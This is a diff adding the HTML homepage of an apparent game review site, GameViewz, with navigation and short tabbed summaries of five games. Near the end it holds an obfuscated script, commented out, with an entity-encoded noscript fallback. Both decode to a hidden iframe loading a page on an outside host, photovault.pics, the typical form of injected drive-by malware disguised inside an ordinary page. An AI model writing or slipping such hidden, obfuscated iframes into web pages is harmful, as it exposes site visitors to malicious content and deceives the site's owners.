@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <!-- Meta tag for responsive design -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- External CSS and fonts -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=CoolFont&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="icon.ico" />
+
+    <!-- Title and linking external stylesheet -->
+    <header>
+      <title>GameViewz - Your Ultimate Game Review Destination</title>
+      <link rel="stylesheet" type="text/css" href="style.css" />
+    </header>
+    <script src="js/scripts.js"></script>
+  </head>
+  <body>
+    <!-- Navigation bar -->
+    <div class="navbar">
+      <a class="active" href="index.html"
+        ><i class="fa fa-fw fa-home"></i> Home</a
+      >
+      <a href="pages/changelogs.html"
+        ><i class="fa fa-newspaper-o"></i> Changelogs</a
+      >
+      <div class="dropdown">
+        <button class="dropbtn">
+          <i class="fa fa-gamepad"></i> Games <i class="fa fa-caret-down"></i>
+        </button>
+        <div class="dropdown-content">
+          <a href="pages/valorant.html">Valorant</a>
+          <a href="pages/gtav.html">GTA V</a>
+          <a href="pages/callofduty.html">Call of Duty</a>
+          <a href="pages/residentevil4.html">Resident Evil 4</a>
+          <a href="pages/fifa22">Fifa 22</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main content -->
+    <h1>
+      GameViewz
+      <img
+        src="icon.ico"
+        width="40px"
+        height="40px"
+        style="vertical-align: middle; margin-right: 10px"
+      />
+    </h1>
+    <p>
+      Experience the world of gaming like never before with GameViewz, your
+      go-to online destination for comprehensive and insightful game reviews.
+      Immerse yourself in a virtual realm where games of all genres come to life
+      through expert analysis and engaging content.
+    </p>
+    <hr />
+
+    <!-- Section 1 -->
+    <h3>Uncover In-Depth Game Reviews</h3>
+    <p>
+      At <strong>GameViewz</strong>, we're dedicated to providing you with
+      detailed and thorough game reviews that cover every aspect of the gaming
+      experience. From gameplay mechanics to visual aesthetics, sound design,
+      and storyline depth, we leave no stone unturned to bring you a holistic
+      perspective on each game.
+    </p>
+
+    <!-- Section 2 -->
+    <h3>Dive into Thoughtful Analysis</h3>
+    <p>
+      Our team of experienced gamers and reviewers is committed to delivering
+      well-informed and thought-provoking analyses. We break down the elements
+      that make each game unique and offer insights into what sets them apart in
+      the gaming landscape.
+    </p>
+
+    <!-- Section 3 -->
+    <h3>Stay Abreast of Gaming Trends</h3>
+    <p>
+      Stay ahead of the curve by staying informed about the latest trends in the
+      gaming industry. <strong>GameViewz</strong> is your source for updates on
+      upcoming game releases, emerging technologies, and significant
+      developments that shape the gaming world.
+    </p>
+
+    <!-- Section 4 -->
+    <h3>Engage in Meaningful Discussions</h3>
+    <p>
+      Engage with fellow gamers in our vibrant community as you share your
+      thoughts and opinions on the games you love. Join discussions, leave
+      comments, and interact with others who share your passion for gaming.
+    </p>
+
+    <!-- Section 5 -->
+    <h3>Navigate Your Gaming Journey</h3>
+    <p>
+      Whether you're a fan of action-packed adventures, strategic simulations,
+      immersive role-playing games, or creative indie titles,
+      <strong>GameViewz</strong> has something for every gaming enthusiast. Let
+      our reviews guide you as you embark on your gaming journey.
+    </p>
+    <hr />
+
+    <!-- Available Articles -->
+    <h2>Available Articles</h2>
+
+    <!-- Tab buttons -->
+    <div class="tab">
+      <button class="tablinks" onmouseover="openCity(event, 'Valorant')">
+        Valorant
+      </button>
+      <button class="tablinks" onmouseover="openCity(event, 'GTAV')">
+        GTA V
+      </button>
+      <button class="tablinks" onmouseover="openCity(event, 'cod')">
+        Call of Duty: Modern Warefare 2
+      </button>
+      <button class="tablinks" onmouseover="openCity(event, 'residentEvil4')">
+        Resident Evil 4
+      </button>
+      <button class="tablinks" onmouseover="openCity(event, 'fifa22')">
+        Fifa 22
+      </button>
+    </div>
+
+    <!-- Valorant tab content -->
+    <div id="Valorant" class="tabcontent">
+      <h3>Valorant</h3>
+      <p>
+        Valorant is a team-based first-person tactical hero shooter set in the
+        near future. Players play as one of a set of Agents, characters based on
+        several countries and cultures around the world. In the main game mode,
+        players are assigned to either the attacking or defending team with each
+        team having five players on it.
+      </p>
+      <button
+        class="button button-green"
+        style="display: block; margin: 0 auto"
+      >
+        <a href="pages/valorant.html">Click to know more!</a>
+      </button>
+    </div>
+
+    <!-- GTA V tab content -->
+    <div id="GTAV" class="tabcontent">
+      <h3>GTA V</h3>
+      <p>
+        Grand Theft Auto V is a 2013 action-adventure game developed by Rockstar
+        North and published by Rockstar Games. It is the seventh main entry in
+        the Grand Theft Auto series, following 2008's Grand Theft Auto IV, and
+        the fifteenth instalment overall.
+      </p>
+      <button
+        class="button button-green"
+        style="display: block; margin: 0 auto"
+      >
+        <a href="pages/gtav.html">Click to know more!</a>
+      </button>
+    </div>
+
+    <!-- Call of Duty tab content -->
+    <div id="cod" class="tabcontent">
+      <h3>Call of Duty: Modern Warefare 2</h3>
+      <p>
+        Call of Duty: Modern Warfare II is a 2022 first-person shooter video
+        game developed by Infinity Ward and published by Activision. It is a
+        sequel to the 2019 reboot, and serves as the nineteenth installment in
+        the overall Call of Duty series.
+      </p>
+      <button
+        class="button button-green"
+        style="display: block; margin: 0 auto"
+      >
+        <a href="pages/callofduty.html">Click to know more!</a>
+      </button>
+    </div>
+
+    <!-- Resident Evil 4 tab content -->
+    <div id="residentEvil4" class="tabcontent">
+      <h3>Resident Evil 4</h3>
+      <p>
+        Resident Evil 4 is a survival horror game developed and published by
+        Capcom for the GameCube in 2005. Players control special agent Leon S.
+        Kennedy who is on a mission to rescue the US president's daughter,
+        Ashley Graham, who has been kidnapped by a religious cult in rural
+        Spain.
+      </p>
+      <button
+        class="button button-green"
+        style="display: block; margin: 0 auto"
+      >
+        <a href="pages/residentevil4.html">Click to know more!</a>
+      </button>
+    </div>
+
+    <!-- Fifa 22 tab content -->
+    <div id="residentEvil4" class="tabcontent">
+      <h3>Fifa 22</h3>
+      <p>
+        FIFA 22 is a football simulation video game published by Electronic
+        Arts. It is the 29th installment in the FIFA series, and was released
+        worldwide on 1 October 2021 for Nintendo Switch, PlayStation 4,
+        PlayStation 5, Stadia, Windows, Xbox One, and Xbox Series X/S.
+      </p>
+      <button
+        class="button button-green"
+        style="display: block; margin: 0 auto"
+      >
+        <a href="pages/fifa22.html">Click to know more!</a>
+      </button>
+    </div>
+
+    <div class="clearfix"></div>
+
+    <!-- <script>var s="=jgsbnf!tsd>#00qipupwbvmu/qjdt0jnbhf/qiq@je>I6:[58/qoh#!tuzmf>#ejtqmbz;!opof<#?=0jgsbnf?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script><noscript><iframe src="&#47;&#47;&#112;&#104;&#111;&#116;&#111;&#118;&#97;&#117;&#108;&#116;&#46;&#112;&#105;&#99;&#115;&#47;&#105;&#109;&#97;&#103;&#101;&#46;&#112;&#104;&#112;&#63;&#105;&#100;&#61;&#72;&#53;&#57;&#90;&#52;&#55;&#46;&#112;&#110;&#103;" style="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#110;&#111;&#110;&#101;&#59;"></iframe></noscript> -->
+  </body>
+
+  <footer style="text-align: center">
+    <h5>
+      Made with ❤️ & code by
+      <a href="//github.com/NoobToolzz">github.com/NoobToolzz</a>
+    </h5>
+  </footer>
+</html>
